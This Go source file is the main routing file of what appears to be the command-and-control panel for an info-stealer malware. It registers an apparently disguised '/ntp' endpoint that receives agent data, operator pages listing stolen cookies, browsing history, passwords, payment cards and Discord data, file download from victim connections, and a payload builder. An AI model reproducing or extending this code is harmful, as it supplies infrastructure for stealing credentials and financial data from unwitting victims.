package main

import (
	"log"
	"server/api"
	"server/config"
	"server/global"
	"server/lang"
	"server/lib"
	"server/user"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/template/django/v3"
)

func main(){
  log.SetFlags(log.Lshortfile)
  log.SetPrefix("[" + time.Now().UTC().Format("01/02/06:15:04") + "] ")

  engine := django.New("./views", ".html")
  app := fiber.New(fiber.Config{
    Views: engine,
    DisableStartupMessage: true,
  })

  lang.LoadLangs()
  if lib.CheckDB() {
    lib.LoadDB("agents", &global.Agents)
    lib.LoadDB("builds", &global.Builds)
    lib.LoadDB("settings", &global.Settings)
    log.Println("Loaded all the databases")
  }

  app.Static("/", "./static")
  app.Post("/ntp", api.Data)
  usr := app.Group("/", user.Middleware)

  usr.Get("/home", user.Home)
  usr.Get("/con/:id", user.Con)
  usr.Get("/con/download/:id", user.ConDownload)
  usr.Get("/con/remove/:id", user.ConRemove)
  
  usr.Get("/data", user.Data)
  usr.Get("/data/cookie", user.DataCookie)
  usr.Get("/data/history", user.DataHistory)
  usr.Get("/data/password", user.DataPassword)
  usr.Get("/data/card", user.DataCard)
  usr.Get("/data/discord", user.DataDiscord)

  usr.Get("/files", user.Files)
  usr.Get("/files/download", user.FilesDownload)
  usr.Get("/files/delete", user.FilesRemove)

  usr.Get("/build", user.Build)
  usr.Get("/build/create", user.BuildCreate)
  usr.Post("/build/create", user.BuildCreatePost)
  usr.Get("/build/download", user.BuildDownload)
  usr.Get("/build/remove", user.BuildRemove)
  
  usr.Get("/login", user.Login)
  usr.Get("/logout", user.Logout)
  usr.Post("/login", user.LoginPost)
  usr.Post("/complete", user.Complete)

  usr.All("*", user.NotFound)
  log.Println("Loaded all the routes")

  intf := "127.0.0.1:8082"
  if config.UseAllInt() {
    intf = "0.0.0.0:8082"
  }

  log.Printf("Starting on http://%s", intf)
  log.Fatal(app.Listen(intf))
}
